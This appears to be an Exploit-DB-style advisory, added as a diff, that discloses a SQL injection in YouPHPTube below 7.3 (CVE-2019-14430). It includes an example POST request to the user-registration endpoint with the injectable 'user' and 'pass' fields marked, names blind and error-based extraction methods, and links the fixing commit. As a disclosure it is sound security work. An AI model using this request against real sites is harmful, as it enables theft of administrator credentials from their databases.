@@ -1,0 +1,36 @@
+# Exploit Title: YouPHPTube < 7.3 SQL Injection
+# Google Dork: /
+# Date: 19.08.2019
+# Exploit Author: Fabian Mosch, r-tec IT Security GmbH
+# Vendor Homepage: https://www.youphptube.com/
+# Software Link: https://github.com/YouPHPTube/YouPHPTube
+# Version: < 7.3
+# Tested on: Linux/Windows
+# CVE : CVE-2019-14430
+
+The parameters "User" as well as "pass" of the user registration function are vulnerable to SQL injection vulnerabilities. By submitting an HTTP POST request to the URL "/objects/userCreate.json.php" an attacker can access the database and read the hashed credentials of an administrator for example.
+
+Example Request:
+
+POST /objects/userCreate.json.php HTTP/1.1
+Host: vulnerablehost.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+[SomeHeaders and Cookies]
+
+user=tes'INJECTHERE&pass=test'INJECTHERE &email=test%40example.com&name=test&captcha=xxxxx
+
+Methods for DB-Extraction are:
+
+
+- Boolean-based blind
+
+- Error-based
+
+- AND/OR time-based blind
+
+
+The vulnerability was fixed with this commit:
+https://github.com/YouPHPTube/YouPHPTube/commit/891843d547f7db5639925a67b7f2fd66721f703a
